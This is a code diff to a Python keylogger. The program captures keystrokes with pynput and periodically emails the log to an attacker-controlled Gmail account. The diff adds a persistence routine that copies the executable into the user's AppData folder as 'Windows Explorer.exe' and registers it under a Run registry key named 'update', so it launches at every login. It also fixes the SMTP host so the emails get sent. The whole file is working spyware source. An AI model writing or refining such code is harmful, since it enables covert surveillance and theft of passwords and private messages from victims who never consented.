@@ -1,17 +1,18 @@
+import os
+import shutil
 import smtplib
+import subprocess
+import sys
 import pynput.keyboard
 import threading
 
 class Keylogger:
-
-    def __init__(self, time_inetrval, email, password):
+    def __init__(self, time_interval, email, password):
+        #self.becomePersistent()
         self.log = ''
-        self.interval = time_inetrval
+        self.interval = time_interval
         self.email = email
         self.password = password
-
-    def log_append(self, string):
-        self.log = self.log + string
 
     def process_key_press(self, key):
         try:
@@ -19,14 +20,18 @@ class Keylogger:
         except:
             if key == key.space:
                 current_key = ' '
-            elif key ==key.backspace:
-                current_key = '<'
             else:
                 current_key = ' ' + str(key) + ''
-        self.log_append(current_key)
+        self.log = self.log + current_key
 
+    def becomePersistent(self):
+        fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
+        if not os.path.exists(fileLocation):
+            shutil.copyfile(sys.executable, fileLocation)
+            subprocess.call('reg add HKCU\Software\Microsoft\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
+    
     def send_email(self, email, password, message):
-        server = smtplib.SMTP('smtp.@gmail.com', 587)
+        server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
